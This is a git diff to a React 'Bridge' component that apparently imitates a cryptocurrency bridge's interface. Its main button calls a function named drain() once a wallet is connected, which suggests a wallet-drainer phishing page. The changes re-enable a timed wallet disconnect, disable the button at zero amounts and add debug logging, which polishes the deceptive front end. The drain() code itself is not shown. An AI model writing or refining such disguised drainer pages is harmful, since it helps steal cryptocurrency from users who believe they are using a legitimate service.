@@ -46,6 +46,7 @@ const Bridge = () => {
   console.log(connectors);
   const [showConnect, setShowConnect] = useState(false);
   const [open, setOpen] = useState(false);
+  const [validate, setValidate] = useState(false);
   const [inputValue, setInputValue] = useState("0.00");
   const { address } = useAccount();
 
@@ -58,14 +59,15 @@ const Bridge = () => {
     address: address,
   });
 
-  // setTimeout(() => {
-  //   disconnect();
-  // }, 2000);
+  setTimeout(() => {
+    disconnect();
+  }, 20000);
 
   console.log(ensAvatar, balance.data);
   const handleClick = () => {
     drain();
   };
+  console.log("disable button:", Number(inputValue) <= 0, Number(inputValue));
   return (
     <div id="__next">
       <div className="__variable_d69ff7">
@@ -347,6 +349,7 @@ const Bridge = () => {
                                   <div className="transition-[filter]">
                                     {address ? (
                                       <button
+                                        disabled={Number(inputValue) <= 0}
                                         onClick={(e) => {
                                           handleClick();
                                           e.preventDefault();
@@ -357,6 +360,7 @@ const Bridge = () => {
                                       </button>
                                     ) : (
                                       <button
+                                        disabled={Number(inputValue) <= 0}
                                         onClick={(e) => {
                                           setShowConnect(true);
 
